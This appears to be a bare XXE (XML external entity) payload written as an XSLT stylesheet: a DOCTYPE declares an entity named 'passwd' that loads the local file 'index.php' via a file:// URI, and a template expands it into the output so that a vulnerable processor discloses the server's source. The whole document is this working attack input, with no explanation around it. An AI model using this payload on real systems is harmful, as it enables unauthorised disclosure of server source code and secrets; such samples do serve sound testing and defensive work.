<!DOCTYPE xsl:stylesheet [
  <!ENTITY passwd SYSTEM "file://index.php">]>

<xsl:template match="/">
  &passwd;
</xsl:template>
